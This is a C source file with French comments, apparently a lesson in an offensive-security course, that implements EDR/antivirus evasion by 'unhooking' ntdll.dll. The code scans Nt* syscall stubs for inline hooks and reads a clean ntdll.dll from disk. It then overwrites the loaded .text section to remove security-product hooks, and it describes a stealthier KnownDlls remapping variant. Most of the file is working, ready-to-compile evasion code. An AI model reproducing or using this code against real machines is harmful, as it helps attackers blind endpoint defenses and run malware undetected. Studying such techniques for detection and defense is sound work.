/*
 * OBJECTIF  : Supprimer les hooks EDR/AV de ntdll.dll pour operer sans detection
 * PREREQUIS : Module 06-NTDLL-Internals (stubs syscall), format PE
 * COMPILE   : cl example.c /Fe:example.exe
 *
 * Les EDR (CrowdStrike, SentinelOne, etc.) placent des hooks inline dans ntdll.dll
 * pour intercepter les appels systeme (NtAllocateVirtualMemory, NtWriteVirtualMemory, etc.)
 * L'unhooking consiste a restaurer les octets originaux de ntdll.dll pour bypasser les EDR.
 *
 * Techniques presentees :
 * 1. Lecture d'une copie propre depuis le disque
 * 2. Remplacement de la section .text
 * 3. Verification des hooks
 */

#include <windows.h>
#include <stdio.h>

/* Verifier si une fonction ntdll est hookee */
BOOL is_hooked(BYTE* func) {
    /* Stub syscall x64 normal : 4C 8B D1 B8 */
    if (func[0] == 0x4C && func[1] == 0x8B && func[2] == 0xD1 && func[3] == 0xB8)
        return FALSE;
    /* Hook typique : E9 (JMP near) ou FF 25 (JMP indirect) */
    if (func[0] == 0xE9 || func[0] == 0xEB ||
        (func[0] == 0xFF && func[1] == 0x25))
        return TRUE;
    /* Autre pattern anormal */
    if (func[0] != 0x4C)
        return TRUE;
    return FALSE;
}

/* Scanner ntdll pour detecter les hooks */
void scan_for_hooks(HMODULE ntdll) {
    printf("[1] Scan des hooks dans ntdll.dll\n\n");

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)ntdll;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)ntdll + dos->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)(
        (BYTE*)ntdll + nt->OptionalHeader.DataDirectory[0].VirtualAddress);

    DWORD* names = (DWORD*)((BYTE*)ntdll + exp->AddressOfNames);
    WORD* ordinals = (WORD*)((BYTE*)ntdll + exp->AddressOfNameOrdinals);
    DWORD* functions = (DWORD*)((BYTE*)ntdll + exp->AddressOfFunctions);

    int hooked = 0, clean = 0;

    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        char* name = (char*)((BYTE*)ntdll + names[i]);
        if (name[0] == 'N' && name[1] == 't' && name[2] >= 'A' && name[2] <= 'Z') {
            BYTE* func = (BYTE*)ntdll + functions[ordinals[i]];
            if (is_hooked(func)) {
                printf("    [!] HOOKED : %-35s  ", name);
                for (int j = 0; j < 6; j++) printf("%02X ", func[j]);
                printf("\n");
                hooked++;
            } else {
                clean++;
            }
        }
    }

    printf("\n    [+] Resultat : %d clean, %d hooked\n\n", clean, hooked);
}

/* Technique principale : Unhooking via copie propre depuis le disque */
void unhook_ntdll(HMODULE ntdll_loaded) {
    printf("[2] Unhooking ntdll.dll (fresh copy from disk)\n\n");

    /* Etape 1 : Lire ntdll.dll depuis le disque (copie non hookee) */
    char path[MAX_PATH];
    GetSystemDirectoryA(path, MAX_PATH);
    strcat_s(path, MAX_PATH, "\\ntdll.dll");

    printf("    [Etape 1] Lecture de %s depuis le disque\n", path);

    HANDLE hFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ,
                                NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("    [-] Impossible d'ouvrir ntdll.dll\n");
        return;
    }

    DWORD file_size = GetFileSize(hFile, NULL);
    BYTE* clean_ntdll = (BYTE*)malloc(file_size);
    DWORD read;
    ReadFile(hFile, clean_ntdll, file_size, &read, NULL);
    CloseHandle(hFile);
    printf("    [+] Lu %lu octets\n", read);

    /* Etape 2 : Trouver la section .text dans les deux copies */
    printf("\n    [Etape 2] Localisation des sections .text\n");

    PIMAGE_DOS_HEADER dos_mem = (PIMAGE_DOS_HEADER)ntdll_loaded;
    PIMAGE_NT_HEADERS nt_mem = (PIMAGE_NT_HEADERS)((BYTE*)ntdll_loaded + dos_mem->e_lfanew);
    PIMAGE_SECTION_HEADER sec_mem = IMAGE_FIRST_SECTION(nt_mem);

    PIMAGE_DOS_HEADER dos_disk = (PIMAGE_DOS_HEADER)clean_ntdll;
    PIMAGE_NT_HEADERS nt_disk = (PIMAGE_NT_HEADERS)(clean_ntdll + dos_disk->e_lfanew);
    PIMAGE_SECTION_HEADER sec_disk = IMAGE_FIRST_SECTION(nt_disk);

    BYTE* text_mem = NULL;
    BYTE* text_disk = NULL;
    DWORD text_size = 0;

    for (WORD i = 0; i < nt_mem->FileHeader.NumberOfSections; i++) {
        if (memcmp(sec_mem[i].Name, ".text", 5) == 0) {
            text_mem = (BYTE*)ntdll_loaded + sec_mem[i].VirtualAddress;
            text_size = sec_mem[i].Misc.VirtualSize;
            break;
        }
    }

    for (WORD i = 0; i < nt_disk->FileHeader.NumberOfSections; i++) {
        if (memcmp(sec_disk[i].Name, ".text", 5) == 0) {
            text_disk = clean_ntdll + sec_disk[i].PointerToRawData;
            break;
        }
    }

    if (!text_mem || !text_disk) {
        printf("    [-] Section .text non trouvee\n");
        free(clean_ntdll);
        return;
    }

    printf("    [+] .text memoire : %p (taille: 0x%lX)\n", text_mem, text_size);
    printf("    [+] .text disque  : offset dans le fichier\n");

    /* Etape 3 : Comparer pour detecter les differences */
    int diffs = 0;
    for (DWORD j = 0; j < text_size && j < sec_disk->SizeOfRawData; j++) {
        if (text_mem[j] != text_disk[j]) diffs++;
    }
    printf("\n    [Etape 3] Differences detectees : %d octets\n", diffs);

    /* Etape 4 : Remplacer la section .text en memoire */
    printf("\n    [Etape 4] Restauration de la section .text\n");
    DWORD old_protect;
    VirtualProtect(text_mem, text_size, PAGE_EXECUTE_READWRITE, &old_protect);
    memcpy(text_mem, text_disk, text_size);
    VirtualProtect(text_mem, text_size, old_protect, &old_protect);
    printf("    [+] Section .text restauree (%lu octets ecrases)\n", text_size);

    /* Verification */
    diffs = 0;
    for (DWORD j = 0; j < text_size && j < sec_disk->SizeOfRawData; j++) {
        if (text_mem[j] != text_disk[j]) diffs++;
    }
    printf("    [+] Verification : %d differences restantes\n\n", diffs);

    free(clean_ntdll);
}

/* Technique alternative : Unhooking par remapping */
void explain_remap_technique(void) {
    printf("[3] Technique alternative : NtMapViewOfSection\n\n");

    printf("    Au lieu de lire depuis le disque, on peut :\n");
    printf("    1. NtOpenFile(\"\\KnownDlls\\ntdll.dll\")  -> ouvrir depuis KnownDlls\n");
    printf("    2. NtCreateSection(hFile)               -> creer une section\n");
    printf("    3. NtMapViewOfSection(hSection)          -> mapper en memoire\n");
    printf("    4. Copier .text propre -> ntdll en memoire\n\n");
    printf("    Avantage : pas d'acces disque (plus furtif)\n");
    printf("    KnownDlls est un cache kernel des DLLs communes\n\n");
}

int main(void) {
    printf("[*] Demo : Unhooking ntdll.dll - Bypass EDR\n");
    printf("[*] ==========================================\n\n");

    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    printf("[+] ntdll.dll en memoire : %p\n\n", ntdll);

    /* Scanner les hooks actuels */
    scan_for_hooks(ntdll);

    /* Effectuer l'unhooking */
    unhook_ntdll(ntdll);

    /* Verifier apres unhooking */
    printf("[*] Re-scan apres unhooking :\n");
    scan_for_hooks(ntdll);

    explain_remap_technique();

    printf("[+] Exemple termine avec succes\n");
    return 0;
}
